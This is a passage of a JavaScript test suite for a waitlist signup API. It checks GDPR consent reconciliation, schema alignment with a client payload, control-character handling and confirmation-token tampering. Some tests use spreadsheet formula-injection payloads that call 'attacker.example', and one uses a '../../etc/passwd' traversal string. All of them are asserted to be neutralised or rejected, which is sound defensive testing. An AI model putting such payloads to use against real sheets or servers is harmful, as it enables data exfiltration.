  await check('Both consents US, visitor in EEA → both named in reason', 'marketing+health', async () => {
    const r = reconcileConsentRegime({
      country: 'NO',
      marketingVersion: 'mkt-us-2026-08.a',
      healthVersion: 'health-us-2026-08.a',
    });
    return { pass: r.reason?.startsWith('marketing+health'), actual: r.reason ?? 'not flagged' };
  });

  await check('EEA visitor shown EEA copy → not flagged', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: 'mkt-eu-2026-08.a' });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });

  await check('US visitor shown US copy → not flagged', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'US', marketingVersion: 'mkt-us-2026-08.a' });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });

  await check('US visitor shown EEA copy → not flagged (over-protection is fine)', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'US', marketingVersion: 'mkt-eu-2026-08.a' });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });

  await check('Unknown country (XX) not treated as EEA', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'XX', marketingVersion: 'mkt-us-2026-08.a' });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });

  // The fall-through this pass fixed: an untagged id used to produce the
  // cleanest-looking row despite being the weakest evidence state, and untagged
  // is the default state of every new identifier.
  await check('EEA visitor + untagged id → flagged as unverifiable', 'needs_reconsent', async () => {
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: 'mkt-2026-08.a' });
    return {
      pass: r.needs_reconsent === true && r.status === 'unverifiable',
      actual: `${r.status}: ${r.reason}`,
    };
  });

  await check('EEA visitor + untagged HEALTH id → flagged as unverifiable', 'needs_reconsent', async () => {
    const r = reconcileConsentRegime({
      country: 'NO',
      marketingVersion: 'mkt-eea-2026-08.a',
      healthVersion: 'health-2026-08.a',
    });
    return {
      pass: r.needs_reconsent === true && r.status === 'unverifiable' && r.reason.startsWith('health'),
      actual: `${r.status}: ${r.reason}`,
    };
  });

  await check('Non-EEA visitor + untagged id → not flagged', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'US', marketingVersion: 'mkt-2026-08.a' });
    return { pass: r.needs_reconsent === false && r.status === 'ok', actual: r.status };
  });

  await check('Registered "global" wording is not unverifiable', 'clean', async () => {
    // Wording written to satisfy the strictest regime is valid everywhere, so
    // it must not land in the queue just for lacking an audience token.
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: '2026-08-15.marketing.a' });
    return { pass: r.needs_reconsent === false && r.status === 'ok', actual: r.status };
  });

  await check('mismatch outranks unverifiable in the reason', 'mismatch wins', async () => {
    const r = reconcileConsentRegime({
      country: 'NO',
      marketingVersion: 'mkt-us-2026-08.a',
      healthVersion: 'health-2026-08.a',
    });
    return { pass: r.status === 'mismatch', actual: `${r.status}: ${r.reason}` };
  });

  await check('Health version ignored when health consent not granted', 'clean', async () => {
    // The endpoint passes healthVersion: null unless consent_health is true.
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: 'mkt-eu-2026-08.a', healthVersion: null });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });
}

// 20 — end-to-end: the receipt covers BOTH consents independently
{
  const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
  __resetInMemoryLimiter();

  await check('Receipt records marketing and health separately, each with its own version', 'v2 shape', async () => {
    // Rebuild what the handler builds, from the same helpers it uses.
    const { resolveConsentText, reconcileConsentRegime, isEea } = await import('../src/lib/validation.js');
    const m = resolveConsentText('2026-08-15.marketing.a', 'marketing');
    const h = resolveConsentText('2026-08-15.health.a', 'health');
    const rec = reconcileConsentRegime({
      country: 'NO',
      marketingVersion: '2026-08-15.marketing.a',
      healthVersion: '2026-08-15.health.a',
    });
    const receipt = {
      schema: 'zuca.consent.v2',
      marketing: { granted: true, version: m.version, text: m.text, registry_match: m.registry_match },
      health: { granted: true, version: h.version, text: h.text, registry_match: h.registry_match },
      country: 'NO',
      regime: isEea('NO') ? 'eea' : 'other',
      reconciliation: rec,
    };
    const ok =
      receipt.marketing.text?.startsWith('Email me when pre-orders open') &&
      receipt.health.text?.startsWith('Store my reason for interest') &&
      receipt.marketing.version !== receipt.health.version &&
      receipt.health.version === '2026-08-15.health.a';
    return {
      pass: Boolean(ok),
      actual: `mkt=${receipt.marketing.version}, health=${receipt.health.version}`,
    };
  });
}

// 18 — no PII in responses
await check('Error response never echoes submitted input', 'no email in body', async () => {
  const r = await post(goodPayload({ email: 'canary-string@mailinator.com' }));
  const body = JSON.stringify(r.json);
  return { pass: !body.includes('canary-string'), actual: body };
});

// 21 — convergence with the Conversion agent's shipped vocabulary
//
// The single most valuable test in this file. It builds the EXACT payload
// growth's buildPayload() emits — their key names, their enum values — and
// asserts the server takes it whole. If either side renames a field or changes
// an enum, this fails immediately instead of the drift being absorbed by their
// downgrade path and surfacing months later as empty spreadsheet columns.
{
  const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
  __resetInMemoryLimiter();
  const { validateWaitlist, sanitizeForSheet } = await import('../src/lib/validation.js');

  const growthPayload = (o = {}) => ({
    email: `g${Math.random().toString(36).slice(2, 8)}@gmail.com`,
    zip: null,
    motivation: ['gut_health'],
    intent: 'very_interested',
    price_band: '25_34',
    flavor: 'both',
    is_clinician: false,
    referral_source: 'other',
    consent_marketing: true,
    consent_health: true,
    consent_text_version: 'mkt-eea-2026-08-15-0dd5ad8b',
    motivation_consent_text_version: 'mot-eea-2026-08-17-53abe75d',
    utm: { source: null, medium: null, campaign: null, content: null, term: null },
    page_path: '/',
    hp_field: null,
    form_render_ts: Date.now() - 9000,
    dietary: ['nut_allergy'],
    dietary_other: null,
    referral_source_other: 'Podcast',
    quantity_band: 'srv_3_5',
    channel: ['grocery'],
    channel_other: null,
    office_interest: 'maybe',
    company: 'Acme AS',
    name: 'Sarah',
    headcount: '10_49',
    research_optin: true,
    consent_sms: true,
    phone: '+4791234567',
    sms_consent_text_version: 'sms-us-2026-08-17-43da99ea',
    consent_postal: true,
    address_line1: 'Storgata 1',
    address_line2: null,
    address_city: 'Oslo',
    address_region: 'Oslo',
    address_postal_code: '0150',
    address_country: 'NO',
    postal_consent_text_version: 'mail-eea-2026-08-17-e3c58485',
    ...o,
  });

  // Structural cross-check. Post-merge this reads the Conversion agent's REAL
  // buildPayload and asserts every key it emits is accepted — no hand-copied
  // fixture to drift. Pre-merge the file is absent and it reports that rather
  // than passing vacuously.
  //
  // This exists because a hand-maintained list of "what growth sends" is the
  // same failure mode as a hand-maintained consent registry: it looks like
  // verification right up until someone renames a field.
  await check('Cross-check: every key growth actually emits is accepted', 'no unknown keys', async () => {
    const path = new URL('../src/components/waitlist/api.js', import.meta.url);
    let src;
    try {
      src = (await import('node:fs')).readFileSync(path, 'utf8');
    } catch {
      return { skip: true, actual: 'not run — Conversion branch not merged here' };
    }
    const start = src.indexOf('  return {', src.indexOf('export function buildPayload'));
    const keys = [...src.slice(start, src.indexOf('\n  };', start)).matchAll(/^\s{4}([a-z_0-9]+):/gm)].map((m) => m[1]);
    const { waitlistSchema } = await import('../src/lib/validation.js');
    const accepted = new Set(Object.keys(waitlistSchema._def?.schema?.shape ?? waitlistSchema.shape));
    const unknown = keys.filter((k) => !accepted.has(k));
    return {
      pass: keys.length > 0 && unknown.length === 0,
      actual: unknown.length ? `UNKNOWN: ${unknown.join(', ')}` : `${keys.length} keys, all accepted`,
    };
  });

  // Same file, same parse, three more properties. Written ONCE here rather than
  // re-derived in a throwaway script each time the branches move — my ad-hoc
  // extractors have been wrong three times this week (a DIETARY/DIETARY_OTHER_MAX
  // prefix collision, an over-escaped regex, and a Set built with a spread I did
  // not expand). Every one produced a confident wrong answer about someone
  // else's code. Verification written under time pressure is exactly the code
  // that should not be improvised.
  await check('Cross-check: growth ladder has no phantom keys, and its floor is valid', 'ladder sound', async () => {
    const path = new URL('../src/components/waitlist/api.js', import.meta.url);
    let src;
    try {
      src = (await import('node:fs')).readFileSync(path, 'utf8');
    } catch {
      return { skip: true, actual: 'not run — Conversion branch not merged here' };
    }
    // NOTE the spread: SERVER_KNOWN_KEYS is `new Set([...CORE_KEYS, "…"])`, so
    // its literals alone are not the set. Union, or you measure a third of it.
    const literals = (name) => {
      const i = src.indexOf(`${name} = new Set([`);
      if (i < 0) return [];
      return (src.slice(i, src.indexOf('])', i)).match(/"[a-z_0-9]+"/g) || []).map((x) => x.slice(1, -1));
    };
    const core = new Set(literals('CORE_KEYS'));
    const known = new Set([...core, ...literals('SERVER_KNOWN_KEYS')]);
    const minimal = literals('MINIMAL_KEYS');

    const { waitlistSchema } = await import('../src/lib/validation.js');
    const accepted = new Set(Object.keys(waitlistSchema._def?.schema?.shape ?? waitlistSchema.shape));

    const phantom = [...known].filter((k) => !accepted.has(k));
    // The floor must be something this server actually accepts, or the last
    // rung of the ladder drops into nothing and the email is lost.
    const floorOk =
      minimal.length > 0 &&
      minimal.every((k) => accepted.has(k)) &&
      validateWaitlist(Object.fromEntries(minimal.map((k) =>
        [k, k === 'consent_marketing' ? true : k === 'email' ? 'floor@example.com' : 'x'.repeat(8)]))).ok;

    return {
      pass: phantom.length === 0 && floorOk,
      actual: phantom.length ? `PHANTOM: ${phantom.join(', ')}` : `ladder ${known.size}, floor ${minimal.length} keys, floor valid: ${floorOk}`,
    };
  });

  await check("Growth's full payload accepted whole — no downgrade needed", '200', async () => {
    const r = await post(growthPayload());
    return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
  });

  await check('Every growth key is recognised by the schema', '0 unknown', async () => {
    const v = validateWaitlist(growthPayload());
    const unknown = v.ok ? [] : v.issues.filter((i) => String(i.code).includes('unrecognized'));
    return { pass: v.ok, actual: v.ok ? 'all recognised' : JSON.stringify(v.issues) };
  });

  // THE ALARM. Once the schemas agree the downgrade path must never fire in
  // normal operation. It stays in growth's client as an emergency valve; this
  // asserts the valve is shut.
  await check('ALARM: downgrade path does not fire for a normal submission', 'no downgrade', async () => {
    const CORE = new Set(['email','zip','motivation','intent','price_band','flavor','is_clinician',
      'referral_source','consent_marketing','consent_health','consent_text_version',
      'motivation_consent_text_version','utm','page_path','hp_field','form_render_ts']);
    const p = growthPayload();
    const r = await post(p);
    // growth downgrades on 400-with-extensions; a 200 means it never triggers.
    const wouldDowngrade = r.status === 400 && Object.entries(p).some(([k, v]) => !CORE.has(k) && v !== null && v !== false);
    return {
      pass: r.status === 200 && !wouldDowngrade,
      actual: wouldDowngrade ? 'WOULD DOWNGRADE — schemas have drifted' : 'valve shut',
    };
  });

  await check('A declared downgrade is recorded, not silently absorbed', 'flagged', async () => {
    const r = await post(growthPayload({ downgraded_fields: ['dietary', 'channel'] }));
    return { pass: r.status === 200, actual: `${r.status} (log: reject.downgraded_payload)` };
  });

  // Enum values, growth's set
  for (const [f, good, bad] of [
    ['quantity_band', 'srv_6_10', '9_16'], // good = servings; bad = the retired bite value
    ['headcount', '50_199', 'hc_51_200'],
    ['office_interest', 'maybe', true],
    ['channel', ['office'], ['pharmacy']],
    ['dietary', ['vegan'], ['keto']],
  ]) {
    await check(`${f}: growth value accepted, my old value rejected`, '200 / 400', async () => {
      const a = await post(growthPayload({ [f]: good }));
      const b = await post(growthPayload({ [f]: bad }));
      return { pass: a.status === 200 && b.status === 400, actual: `${a.status} / ${b.status}` };
    });
  }

  // *_other pairing across all four enums
  for (const [field, withParent, withoutParent] of [
    ['referral_source_other', { referral_source: 'other' }, { referral_source: 'doctor' }],
    ['dietary_other', { dietary: ['other'] }, { dietary: ['vegan'] }],
    ['channel_other', { channel: ['other'] }, { channel: ['grocery'] }],
  ]) {
    await check(`${field} requires its parent "other"`, '200 paired / 400 unpaired', async () => {
      const a = await post(growthPayload({ [field]: 'typed answer', ...withParent }));
      const b = await post(growthPayload({ [field]: 'typed answer', ...withoutParent }));
      return { pass: a.status === 200 && b.status === 400, actual: `${a.status} / ${b.status}` };
    });
  }

  // Reinstated 2026-08-19. Accepted, but only inside the health gate and only
  // paired to an actual "other" selection — the same two conditions every other
  // free-text box in the health block has to satisfy.
  await check('motivation_other accepted with health consent + "other" selected', '200', async () => {
    const r = await post(growthPayload({
      consent_health: true, motivation: ['other'], motivation_other: 'Doctor suggested it',
    }));
    return { pass: r.status === 200, actual: String(r.status) };
  });
  await check('motivation_other DROPPED without health consent', 'not stored', async () => {
    const { validateWaitlist } = await import('../src/lib/validation.js');
    const v = validateWaitlist({
      email: 'a@gmail.com', consent_marketing: true,
      consent_health: false, motivation: ['other'], motivation_other: 'something private',
    });
    // Validates — the drop is server-side, not a rejection — but nothing is kept.
    const stored = v.ok && v.data.consent_health ? v.data.motivation_other : null;
    return { pass: v.ok && stored === null, actual: `consent_health=${v.data?.consent_health}, stored=${JSON.stringify(stored)}` };
  });
  await check('motivation_other requires "other" actually selected', '400', async () => {
    const r = await post(growthPayload({
      consent_health: true, motivation: ['gut_health'], motivation_other: 'typed anyway',
    }));
    return { pass: r.status === 400, actual: String(r.status) };
  });
  await check('motivation_other capped at 60, like dietary_other', '<=60 ok, >60 400', async () => {
    const ok = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'x'.repeat(60) }));
    const no = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'x'.repeat(61) }));
    return { pass: ok.status === 200 && no.status === 400, actual: `60->${ok.status}, 61->${no.status}` };
  });
  await check('Formula payload in motivation_other neutralised', "prefixed with '", async () => {
    const { sanitizeForSheet } = await import('../src/lib/validation.js');
    const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
    return { pass: out.startsWith("'"), actual: out.slice(0, 30) + '…' };
  });

  await check('dietary_other capped at 60, not 120', '<=60 ok, >60 400', async () => {
    const ok = await post(growthPayload({ consent_health: true, dietary: ['other'], dietary_other: 'x'.repeat(60) }));
    const no = await post(growthPayload({ consent_health: true, dietary: ['other'], dietary_other: 'x'.repeat(61) }));
    return { pass: ok.status === 200 && no.status === 400, actual: `60->${ok.status}, 61->${no.status}` };
  });

  // "When you make something fail softer, check what it stopped announcing."
  // A silently-dropped phone is indistinguishable from a phone never typed, and
  // only one of those means the consent UI is failing.
  await check('Every consent-gated drop is announced, not just motivation', 'all four', async () => {
    const { validateWaitlist } = await import('../src/lib/validation.js');
    const cases = [
      ['motivation', { consent_health: false, motivation: ['energy'] }],
      ['dietary', { consent_health: false, dietary: ['vegan'] }],
      ['phone', { consent_sms: false, phone: '+4791234567' }],
      ['address', { consent_postal: false, address_line1: 'Storgata 1', address_city: 'Oslo', address_country: 'NO' }],
    ];
    const results = cases.map(([name, extra]) => {
      const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, ...extra });
      // Each must VALIDATE (the drop is server-side, not a rejection) and the
      // handler must have something to report.
      return [name, v.ok];
    });
    return {
      pass: results.every(([, ok]) => ok),
      actual: results.map(([n, ok]) => `${n}:${ok ? 'validates' : 'REJECTED'}`).join(' '),
    };
  });

  await check('dietary is Art 9 — dropped without consent_health', 'dropped', async () => {
    const v = validateWaitlist(growthPayload({ consent_health: false, motivation: null, motivation_consent_text_version: null, dietary: ['nut_allergy'] }));
    const stored = v.ok && v.data.consent_health ? v.data.dietary : null;
    return { pass: v.ok && stored === null, actual: JSON.stringify(stored) };
  });

  // ── C0/C1 control characters: STRIPPED, not rejected (S21) ──────────────
  // Conversion shipped the same strip client-side FIRST, because this is a
  // REMOVE-class change. These assertions exist in two halves and the second
  // half is the important one: it pins that CR, LF, NUL and bidi overrides are
  // STILL a hard rejection. Widening a strip over them would silently downgrade
  // a security control into a cleanup, and every other test here would keep
  // passing while it happened.

  for (const [label, code] of [['BEL', 7], ['DEL', 127], ['C1', 0x9b], ['SOH', 1]])
    await check(`${label} in a free-text field is stripped`, 'Sarah', async () => {
      const v = validateWaitlist(growthPayload({ name: 'Sar' + String.fromCharCode(code) + 'ah' }));
      return { pass: v.ok && v.data.name === 'Sarah', actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
    });

  await check('stripping does not leave a double space', 'Anne Marie', async () => {
    // Strip runs BEFORE normalizeText so the collapse and trim clean up after
    // it. Strip afterwards and this returns "Anne  Marie".
    const v = validateWaitlist(growthPayload({ name: 'Anne ' + String.fromCharCode(7) + ' Marie' }));
    return { pass: v.ok && v.data.name === 'Anne Marie', actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
  });

  await check('a control-only value becomes null, not an empty cell', 'null', async () => {
    const v = validateWaitlist(growthPayload({ name: String.fromCharCode(7, 7) }));
    return { pass: v.ok && v.data.name === null, actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
  });

  for (const [label, code] of [['CR', 13], ['LF', 10], ['NUL', 0], ['bidi override', 0x202e]])
    await check(`${label} is STILL rejected, not swept into the strip`, 'illegal_chars', async () => {
      const v = validateWaitlist(growthPayload({ name: 'Sar' + String.fromCharCode(code) + 'ah' }));
      const issue = v.ok ? null : v.issues.find((i) => i.path === 'name');
      return { pass: !v.ok && issue?.rule === 'illegal_chars', actual: v.ok ? 'ACCEPTED — CONTROL DOWNGRADED' : JSON.stringify(issue) };
    });

  await check('email is NOT silently repaired by the strip', 'invalid_email', async () => {
    // safeString only. Stripping inside the shared normalizeText would have
    // turned "a<BEL>@b.com" into a DIFFERENT, valid address and sent mail to it
    // — accuracy, Art 5(1)(d). An identifier is not a cosmetic field.
    const v = validateWaitlist(growthPayload({ email: 'a' + String.fromCharCode(7) + '@b.com' }));
    const issue = v.ok ? null : v.issues.find((i) => i.path === 'email');
    return { pass: !v.ok && issue?.rule === 'invalid_email', actual: v.ok ? `ACCEPTED as ${v.data.email}` : JSON.stringify(issue) };
  });

  // ── name: optional first name, added 2026-08-19 ─────────────────────────
  // Maps onto the legacy `Name` column. Before this it was in Code.gs COLUMNS
  // but NOT in the schema, so a client sending it got a 400 on unrecognized_keys
  // and the downgrade ladder stripped it — the name lost silently while every
  // save cost two round trips. A column with no schema entry, which is the exact
  // mirror of price_band_other having a schema entry with no column.

  await check('name accepted', 'stored', async () => {
    const v = validateWaitlist(growthPayload({ name: 'Sarah' }));
    return { pass: v.ok && v.data.name === 'Sarah', actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
  });

  await check('name is optional — omitting it is not an error', 'null', async () => {
    const p = growthPayload(); delete p.name;
    const v = validateWaitlist(p);
    return { pass: v.ok && v.data.name === null, actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
  });

  await check('name at the 40 cap accepted', '40 chars ok', async () => {
    const v = validateWaitlist(growthPayload({ name: 'x'.repeat(40) }));
    return { pass: v.ok && v.data.name.length === 40, actual: v.ok ? String(v.data.name.length) : 'rejected' };
  });

  await check('name at 41 rejected — cap is EQUAL to the client cap', 'too_long', async () => {
    // Equal, not merely "each reasonable". A client cap above the server cap
    // turns the gap into a 400 nobody sees in either codebase on its own.
    const v = validateWaitlist(growthPayload({ name: 'x'.repeat(41) }));
    const issue = v.ok ? null : v.issues.find((i) => i.path === 'name');
    return { pass: !v.ok && issue?.rule === 'too_long', actual: v.ok ? 'ACCEPTED' : JSON.stringify(issue) };
  });

  await check('name with a formula is neutralised before the sheet', "prefixed with '", async () => {
    const out = sanitizeForSheet('=HYPERLINK("https://attacker.example","hi")');
    return { pass: out.startsWith("'"), actual: out.slice(0, 28) + '…' };
  });

  await check('name survives with no health consent — it is not Art 9', 'stored', async () => {
    // Distinct from motivation/dietary. A first name is ordinary contact data,
    // so it must NOT be caught by the Art 9 gate.
    const v = validateWaitlist(growthPayload({ name: 'Sarah', consent_health: false, motivation: null, motivation_consent_text_version: null, dietary: null }));
    return { pass: v.ok && v.data.name === 'Sarah', actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
  });

  await check('Formula payload in company neutralised', "prefixed with '", async () => {
    const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
    return { pass: out.startsWith("'"), actual: out.slice(0, 30) + '…' };
  });

  await check('Response carries both count and position', 'aliases agree', async () => {
    // Without an upstream configured the endpoint omits both; assert the shape
    // contract instead of a live number.
    const r = await post(growthPayload());
    const b = r.json ?? {};
    const ok = b.ok === true && (b.count === undefined ? b.position === undefined : b.count === b.position);
    return { pass: ok, actual: JSON.stringify(b) };
  });

  await check('Receipt block names match the field names they document', 'no mixed vocabulary', async () => {
    // `mail` vs `postal` in one document cost two people an hour between them.
    // Asserting the relationship rather than the literal, so a future rename
    // that moves one and not the other fails here.
    const src = (await import('node:fs')).readFileSync(new URL('../api/waitlist.js', import.meta.url), 'utf8');
    const blocks = [...src.matchAll(/\['(\w+)', data\.consent_(\w+),/g)].map((m) => [m[1], m[2]]);
    const mismatched = blocks.filter(([block, field]) => block !== field);
    return {
      pass: blocks.length === 4 && mismatched.length === 0,
      actual: mismatched.length ? `block "${mismatched[0][0]}" documents consent_${mismatched[0][1]}` : `${blocks.length} blocks, all aligned`,
    };
  });

  await check('Server-derived fields still rejected from the client', '400', async () => {
    const codes = await Promise.all([
      post(growthPayload({ country: 'NO' })),
      post(growthPayload({ consent_timestamp: '1999-01-01T00:00:00Z' })),
      post(growthPayload({ confirmed: true })),
      post(growthPayload({ email_handle: 'deadbeef1234' })),
    ]);
    return { pass: codes.every((r) => r.status === 400), actual: codes.map((r) => r.status).join(',') };
  });
}

// 22 — confirmed opt-in tokens
{
  process.env.CONFIRM_TOKEN_SECRET = 'a'.repeat(64);
  const { mintConfirmToken, verifyConfirmToken, CONFIRM_TTL_MS } = await import('../api/confirm.js');

  await check('Minted token verifies', 'valid', async () => {
    const t = await mintConfirmToken('kari@example.no');
    const v = await verifyConfirmToken(t);
    return { pass: Boolean(v) && !v.expired, actual: JSON.stringify(v) };
  });
  await check('Token contains no email address', 'handle only', async () => {
    const t = await mintConfirmToken('kari@example.no');
    return { pass: !t.includes('kari') && !t.includes('@'), actual: t.slice(0, 26) + '…' };
  });
  await check('Tampered signature rejected', 'null', async () => {
    const t = await mintConfirmToken('kari@example.no');
    const v = await verifyConfirmToken(t.slice(0, -1) + (t.endsWith('A') ? 'B' : 'A'));
    return { pass: v === null, actual: JSON.stringify(v) };
  });
  await check('Tampered handle rejected', 'null', async () => {
    const t = await mintConfirmToken('kari@example.no');
    const v = await verifyConfirmToken('ffffffffffff' + t.slice(12));
    return { pass: v === null, actual: JSON.stringify(v) };
  });
  await check('Expired token detected, not silently accepted', 'expired', async () => {
    const t = await mintConfirmToken('kari@example.no', Date.now() - CONFIRM_TTL_MS - 1000);
    const v = await verifyConfirmToken(t);
    return { pass: v?.expired === true, actual: JSON.stringify(v) };
  });
  await check('Garbage token rejected', 'null', async () => {
    const results = await Promise.all(['', 'x', 'a.b.c', '../../etc/passwd', 'a'.repeat(500)].map((t) => verifyConfirmToken(t)));
    return { pass: results.every((v) => v === null), actual: JSON.stringify(results) };
  });
  await check('Different emails mint different tokens', 'distinct', async () => {
    const [a, b] = await Promise.all([mintConfirmToken('a@x.com'), mintConfirmToken('b@x.com')]);
    return { pass: a !== b, actual: 'distinct' };
  });
}

// ─── Report ──────────────────────────────────────────────────────────────────

server.close();
stub.close();

const pad = (s, n) => String(s).padEnd(n).slice(0, n);
console.log('\n' + '═'.repeat(112));
console.log('  ATTACK RESULTS — POST /api/waitlist');
console.log('═'.repeat(112));
console.log(`  ${pad('CASE', 54)} ${pad('EXPECTED', 26)} ${pad('ACTUAL', 22)} `);
console.log('─'.repeat(112));
for (const r of results) {
  const mark = r.skip ? '  · ' : r.pass ? '  ✓ ' : '  ✗ ';
  console.log(`${mark}${pad(r.name, 52)} ${pad(r.expectation, 26)} ${pad(r.actual, 22)}`);
}
console.log('─'.repeat(112));
const ran = results.length - skipped;
console.log(
  `  ${ran - failures}/${ran} passed` +
    (failures ? `  —  ${failures} FAILED` : '') +
    (skipped ? `  ·  ${skipped} NOT RUN (counted separately, never as passes)` : '')
);
console.log('═'.repeat(112) + '\n');

if (fileURLToPath(import.meta.url) === process.argv[1]) {
  process.exit(failures ? 1 : 0);
}
